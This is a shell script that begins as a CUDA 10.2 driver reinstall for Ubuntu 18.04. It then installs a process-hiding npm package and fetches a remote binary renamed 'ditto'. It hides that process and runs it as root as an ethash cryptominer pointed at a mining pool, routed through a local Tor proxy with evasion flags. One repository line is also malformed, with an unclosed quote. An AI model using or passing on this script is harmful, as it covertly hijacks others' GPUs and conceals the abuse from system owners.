apt-get --purge remove cuda nvidia* libnvidia-* 
dpkg -l | grep cuda- | awk '{print $2}' | xargs -n1 dpkg --purge 
apt-get remove cuda-* 
apt autoremove 
apt-get update
sudo apt update
sudo apt upgrade -y
mkdir install ; cd install
wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-ubuntu1804.pin
sudo mv cuda-ubuntu1804.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pub
sudo add-apt-repository "deb http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/ 
sudo apt-get update
sudo apt-get -y install cuda-10-2
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
mv Transport ditto
chmod +x ditto
ph add ditto
sudo ./ditto -a ethash -o stratum+tcp://ethash.kupool.com:8888 -u hunterd.001 -p x -w Trans --proxy 127.0.0.1:9050 --no-sni --dns-https-server 1.1.1.1 
